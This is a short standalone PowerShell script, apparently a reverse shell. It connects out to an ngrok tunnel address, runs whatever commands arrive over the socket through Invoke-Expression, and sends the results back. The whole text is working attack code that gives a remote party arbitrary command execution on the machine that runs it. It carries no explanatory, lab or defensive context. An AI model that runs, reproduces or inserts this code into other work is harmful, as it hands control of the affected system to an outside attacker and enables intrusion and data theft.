$c=New-Object System.Net.Sockets.TCPClient("0.tcp.ap.ngrok.io",11161);
$s=$c.GetStream();[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length))-ne 0){
    $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $sb=(iex $d 2>&1|Out-String);
    $sbt=([text.encoding]::ASCII).GetBytes($sb);
    $s.Write($sbt,0,$sbt.Length);$s.Flush()
};$c.Close()
